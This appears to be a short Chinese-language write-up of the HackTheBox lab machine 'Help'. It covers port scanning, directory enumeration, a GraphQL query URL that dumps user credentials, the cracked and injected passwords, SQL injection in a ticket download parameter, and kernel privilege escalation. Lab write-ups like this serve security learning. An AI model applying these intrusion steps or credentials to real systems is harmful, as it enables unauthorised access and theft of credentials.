# nmap 

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://help.htb/
|_http-server-header: Apache/2.4.18 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).

```

# dirsearch

### 80端口

扫目录先扫到http://10.10.10.121/support，继续扫扫到下面这些目录，在readme中找到版本号为1.0.2

```
[16:57:41] 200 -  378B  - /support/.gitattributes                           
[16:59:14] 200 -    1KB - /support/favicon.ico                              
[16:59:25] 200 -    0B  - /support/images/
[16:59:34] 200 -    7KB - /support/LICENSE.txt                              
[17:00:08] 200 -    3KB - /support/README.md                                
[17:00:08] 200 -    3KB - /support/readme.html 
```

该版本存在SQL注入和任意文件上传

sql注入需要登录

### 查看3000端口

查看响应头服务器正在运行express框架

搜到express js query language可以查到graphql

使用graphql语法查询即可得到username和password

```
http://10.10.10.121:3000/graphql?query={user{username,password}}
```



```
username	"helpme@helpme.com"
password	"5d3c93182bb20f07b994a7f617e99cff"
```

```
helpme@helpme.com：godhelpmeplz
```

### sql注入

登录后进行ticket上传，注入点就在上传的文件下载的路径的param[]参数

sql注入得到admin密码

```
admin：Welcome1
```

ssh连接尝试多个用户名，最后help成功登录，

该版本存在内核漏洞，内核提权即可